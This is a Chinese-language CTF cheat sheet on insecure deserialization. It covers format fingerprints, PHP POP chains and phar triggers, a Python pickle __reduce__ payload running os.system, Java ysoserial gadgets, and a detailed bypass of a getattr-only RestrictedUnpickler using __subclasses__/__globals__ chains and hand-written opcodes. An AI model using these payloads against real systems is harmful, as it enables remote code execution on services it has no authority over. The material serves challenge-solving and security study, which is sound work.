# 反序列化

## 先认格式

| 特征 | 语言/格式 |
|---|---|
| `O:8:"stdClass":...` / `a:2:{...}` | PHP `serialize` |
| `\x80\x04\x95...` / `rO0AB` (base64) | Python pickle / Java `ObjectOutputStream` |
| `aced0005` | Java 序列化流头 |
| `rO0AB` | Java base64 |
| `_$$ND_FUNC$$_` | Node.js `node-serialize` |
| `\x04\x08` + `o:` | Ruby Marshal |

Cookie、隐藏字段、上传文件内容、`Content-Type: application/x-java-serialized-object` 都是入口。

## PHP

```php
O:4:"User":1:{s:4:"name";s:5:"admin";}
```

POP 链思路：从可控属性出发，找 `__destruct`/`__wakeup`/`__toString`/`__call` 里能连到
`file_put_contents` / `system` / `call_user_func` 的类。

```php
// phar 反序列化：文件函数只要碰到 phar:// 就会触发
phar://upload/evil.phar/test.txt
```

## Python pickle

```python
import pickle, os, base64
class R:
    def __reduce__(self):
        return (os.system, ("id",))
payload = base64.b64encode(pickle.dumps(R())).decode()
```

注意：需要**同时**满足目标读取该 cookie/字段的条件（只有 session 在也没用）。

## Java

工具链：`ysoserial` / `JNDI-Injection`。先看依赖（`pom.xml` / `lib/*.jar` / `.class` 反编译），
再选 CommonsCollections / Groovy / Spring 对应的 gadget。JNDI 注入还需要出网或本地 LDAP。

## 判定"反序列化生效"

- 响应里出现命令输出 / 延迟
- 报错里出现类名（说明真的在 `unserialize`）
- cookie 长度与结构变化后被接受

## 容易白干的地方

- 上传了 `.pkl`/`.phar` 但没人反序列化它 → 先找"消费点"（哪里读这个文件/字段）
- PHP 需要**真的**走到 `unserialize`；`json_decode` 不触发
- 链里某个类的属性名/可见性不对（`protected` 会有 `\0*\0` 前缀）→ 生成器要精确

## Python pickle：白名单只放了 getattr 怎么办

很多题不禁止 `pickle.loads`，而是给一个 `RestrictedUnpickler`：

```python
ALLOWED = {("builtins", "getattr"), ("builtins", "type")}
def find_class(self, mod, name):
    if (mod, name) not in ALLOWED:
        raise UnpicklingError(f"Forbidden: {mod}.{name}")
    return super().find_class(mod, name)
```

看起来无害 —— 但 **`getattr` 一个就够**。任意属性访问都能写成 `getattr(obj, 'name')`：

```
().__class__.__base__.__subclasses__()[n].__init__.__globals__['popen']('id')
```

先把这条链拆成 getattr 就通了。用 `pickle` 工具直接生成，不必手拼 opcode：

```json
{"expr":"().__class__.__base__.__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()"}
```

它会回报**用到的 GLOBAL 列表** —— 这是判断「会不会被白名单拦」的唯一依据。全是 `builtins.getattr` 就安全。

### 手工版的 opcode 对照（工具坏了也能手写）

| 想要 | opcode |
|---|---|
| 空元组 | `)` |
| 字符串 | `S'text'\n` |
| 整数 | `I141\n` |
| 取模块属性 | `cmodule\nname\n` |
| 组元组 | `(` … `t` |
| 调用 | 压 callable + 压参数元组 + `R` |
| 结束 | `.` |

所以 `getattr(x, 'y')` 就是：`cbuiltins\ngetattr\n(` + x 的 opcode + `S'y'\n` + `tR`。

**坑**：单字符 opcode 之间**不能插入换行**（`( … tR` 必须连写），
但 `S` / `I` / `c` 的行参数必须以 `\n` 结尾。手拼时错一个换行整条链就废。

### 找子类下标

不同 Python 版本 `__subclasses__()` 的顺序不一样，别把下标写死：

```
[int(x.__name__ == 'catch_warnings') * i for i, x in enumerate(().__class__.__base__.__subclasses__())]
```

更省事的做法：先用 `getattr(object,'__subclasses__')()` 把结果整体打出来（很多题会把返回值直接 JSON 回显），
数一下目标类的下标；或者用 `__init__.__globals__` 那条路径，它对下标不敏感的部分要自己试几个。

### 其他常见白名单缺口

| 白名单里有 | 立刻可用 |
|---|---|
| `builtins.getattr` | 任意属性访问（本节） |
| `builtins.type` | `type('',(),{})` 造类，配合 `__mro__` 走 |
| `builtins.eval` / `exec` | 直接执行，最省事 |
| `builtins.__import__` | `__import__('os').popen(...)` |
| `copyreg._reconstructor` | 老牌 gadget |
| `subprocess.Popen` / `os.system` | 直接调用 |
